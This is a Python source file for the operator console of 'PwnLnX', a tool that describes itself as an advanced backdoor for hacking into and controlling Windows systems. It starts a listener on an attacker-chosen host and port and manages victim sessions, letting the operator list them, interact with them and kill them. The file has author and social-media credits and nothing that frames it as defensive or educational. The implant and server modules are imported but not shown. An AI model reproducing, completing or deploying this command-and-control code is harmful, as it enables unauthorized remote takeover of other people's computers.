from server.server import Server
from termcolor import colored
from random import SystemRandom
from pyfiglet import figlet_format
import os
from argparse import ArgumentParser

import socket



class PwnLnX:
	def __init__(self):
		self.__main()

	def __main(self):
		parser = ArgumentParser(description="An advanced backdoor for hacking into and  control windows operating system. Use it responsibily.")
		parser.add_argument("-lh", "--lhost", help="Your local private IP Address to bind the incoming connecion to, use your public public IP address for remote attacks.", required=True)
		parser.add_argument("-lp", "--lport", help="Any unused port to listen for the incoming connection.", type=int, required=True)
		args = parser.parse_args()
		lhost = args.lhost
		lport = args.lport
		self.__full_banner()

		server = Server(lhost, lport)

		while True:
			cmd = input(f'''
{colored("┌──(", "cyan")}{colored(f"pwnlnx㉿{socket.gethostname()}", "blue")}{colored(")-[", "cyan")}{colored("~", "white")}{colored("]","cyan")}
{colored("└─","cyan")}{colored("$", "blue")} ''')
			if cmd == "help":
				self.__show_help()
			elif cmd == "show sessions":
				if server.c_sockets:
					print("session_id\ttarget ip\n")
					server.show_connections()
				else:
					print(f'{colored("[-]", "yellow")} No available sessions.')
			elif cmd[:7] == "session":
				try:
					s_id = int(cmd[8:])
					c_socket = server.c_sockets[s_id]
					c_addr = server.c_addrs[int(s_id)]
					server.control_clients(c_socket, c_addr, s_id)
				except Exception as e:
					print(f'{colored("[!]", "red")} No Session under that ID.')
			elif cmd[:4] == "kill":
				if isinstance(int(cmd[5:]), int):
					s_id = int(cmd[5:])
					try:
						if server.c_sockets:
							c_socket = server.c_sockets[s_id]
							server.reliable_send(c_socket, "quit")
							server.c_sockets.pop(s_id)
							server.c_addrs.pop(s_id)
						else:
							print(f'{colored("[-]", "yellow")} No session under that id.')
					except IndexError:
						print(f'{colored("[-]", "yellow")} No session under that id.')					
				elif cmd[5:] == "all":
					if server.c_sockets:
						for c_socket in server.c_sockets:
							server.reliable_send(c_socket, "quit")
						del server.c_sockets[:]
						del server.c_addrs[:]
					else:
						print(f'{colored("[-]", "yellow")} No available session(s) to kill.')
					
			elif cmd == "exit":
				if server.c_sockets:
					for c_socket in server.c_sockets:
						server.reliable_send(c_socket, "quit")
				server.terminate_ac = True
				break
			elif cmd == "clear":
				os.system("clear")
			elif cmd == "banner":
				self.__banner()

			else:
				print(f'{colored("[!]", "red")} bash: {colored(f"{cmd}", "red")} : command not found')



	def __banner(self):
		fonts =	['speed', 'com_sen_', 'charact6', 'rounded', '5lineoblique']
		colors = ['red', 'blue', 'yellow', 'magenta', 'green', 'cyan', 'white']
		try:
			print(f'\n\n{colored(figlet_format(text="PwnLnX", font=fonts[int(SystemRandom().choice(range(5)))]),f"{colors[int(SystemRandom().choice(range(7)))]}")}')
		except:
			print(f'\n\n{colored(figlet_format(text="PwnLnX", font="slant"), "red")}')

	def __full_banner(self):
		os.system("clear")
		print(colored('''	                                                  
			        ##  ## ##  ## ###  ##  ##          
			 #####  ##  ## ### ##  ##  ### ##  ##  ##  
			 ##  ## ##  ## ######  ##  ######   ####   
			 ##  ## ###### ## ###  ##  ## ###    ##    
			 #####  ###### ##  ##  ##  ##  ##   ####   
			 ##     ##  ## ##  ## #### ##  ##  ##  ##v1.2  
			 ##                                        
		''', "green"))
		print(f'''\t\t\t\t{colored("coded by TRAW - @xtremepentest","magenta")}\n\t\t\t\t[+] Follow me on twitter: https://twitter.com/xtremepentest\n\t\t\t\t[+] Join Us on Telegram: https://discord.gg/aYVNsSVqGc''')

	def __show_help(self):
		_help = f'''

{colored("CORE COMMANDS:", "magenta")}
	    {colored("help", "cyan")}                    --> show this help.
	    {colored("exit", "cyan")}                    --> close all the sessions and quit the progaram.


	    {colored("show sessions", "cyan")}           --> show all available sessions.
	    {colored("session", "cyan")} [{colored("ID","green")}]            --> interact with with the specified session id.

	    {colored("kill", "cyan")} [{colored("session id/all","green")}]   --> kill the specified session or all to kill all sessions.
	    {colored("banner", "cyan")}                  --> change the program banners

'''
		print(_help)

pwnlnx = PwnLnX()
